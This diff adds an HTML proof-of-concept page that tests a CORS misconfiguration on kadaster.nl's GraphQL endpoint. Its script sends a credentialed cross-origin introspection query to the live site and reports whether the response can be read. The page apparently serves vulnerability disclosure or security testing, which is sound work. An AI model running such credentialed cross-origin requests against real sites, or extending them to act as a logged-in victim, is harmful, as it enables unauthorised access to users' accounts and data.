@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>CORS PoC</title>
+<style>
+body { background: #0a0a0a; color: #e0e0e0; font-family: monospace; padding: 20px; }
+h2 { color: #fff; }
+button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 8px 16px; cursor: pointer; font-family: monospace; font-size: 14px; }
+button:hover { background: #0f0; color: #000; }
+pre { background: #111; color: #0f0; padding: 15px; max-height: 500px; overflow: auto; border: 1px solid #333; white-space: pre-wrap; }
+.info { color: #888; font-size: 12px; }
+</style>
+</head>
+<body>
+<h2>CORS Misconfiguration PoC - Read Only</h2>
+<p class="info">This page sends a read-only GraphQL introspection query cross-origin with credentials: 'include'.<br>
+If the response is readable, CORS is misconfigured (any origin can make authenticated requests).</p>
+<p class="info"><strong>Origin of this page:</strong> <span id="origin"></span></p>
+<button onclick="testCORS()">Run Test</button>
+<pre id="output"></pre>
+
+<script>
+document.getElementById('origin').textContent = window.location.origin;
+
+async function testCORS() {
+  const out = document.getElementById('output');
+  const target = 'https://www.kadaster.nl/o/graphql';
+  out.textContent = '[*] Page origin: ' + window.location.origin + '\n';
+  out.textContent += '[*] Target: ' + target + '\n';
+  out.textContent += '[*] Sending cross-origin POST with credentials: include...\n\n';
+
+  try {
+    const resp = await fetch(target, {
+      method: 'POST',
+      credentials: 'include',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        query: '{ __schema { queryType { name } mutationType { name } } }'
+      })
+    });
+
+    const acao = resp.headers.get('access-control-allow-origin');
+    const acac = resp.headers.get('access-control-allow-credentials');
+
+    out.textContent += '[+] Response status: ' + resp.status + '\n';
+    out.textContent += '[+] ACAO header: ' + acao + '\n';
+    out.textContent += '[+] ACAC header: ' + acac + '\n\n';
+
+    const data = await resp.json();
+    out.textContent += '[!] VULNERABLE - Cross-origin response was readable!\n';
+    out.textContent += '[!] JavaScript on ' + window.location.origin + ' can read data from ' + target + '\n';
+    out.textContent += '[!] With a logged-in user, this could execute mutations as that user.\n\n';
+    out.textContent += 'Response body:\n' + JSON.stringify(data, null, 2);
+  } catch (e) {
+    out.textContent += '[-] BLOCKED - Browser prevented cross-origin read.\n';
+    out.textContent += '[-] Error: ' + e.message + '\n\n';
+    out.textContent += '[i] This means SameSite cookies or browser policy mitigated the CORS misconfiguration.\n';
+    out.textContent += '[i] Note: The server-side CORS headers are still wrong (reflects any origin with credentials).\n';
+  }
+}
+</script>
+</body>
+</html>
